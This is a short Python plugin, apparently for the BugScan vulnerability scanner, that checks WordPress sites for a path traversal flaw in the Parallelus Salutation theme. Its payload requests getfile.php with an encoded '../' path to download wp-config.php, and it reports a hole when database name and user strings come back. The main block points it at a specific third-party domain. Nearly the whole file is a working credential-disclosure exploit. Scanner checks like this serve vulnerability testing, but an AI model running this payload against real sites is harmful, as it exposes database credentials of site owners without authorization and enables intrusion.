#!/usr/bin/python
#-*- coding: utf-8 -*-
#Refer：https://www.bugscan.net/#!/x/23131
#__Author__ = 这个程序员不太冷


def assign(service, arg):
    if service == "wordpress":
        return True, arg    

def audit(arg):
    payload = 'wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php'
    verify_url = arg  + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if  code== 200 and 'DB_NAME' in res and 'DB_USER' in res:
        security_hole(verify_url)
              
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress','http://www.patchingprotocol.com/')[1])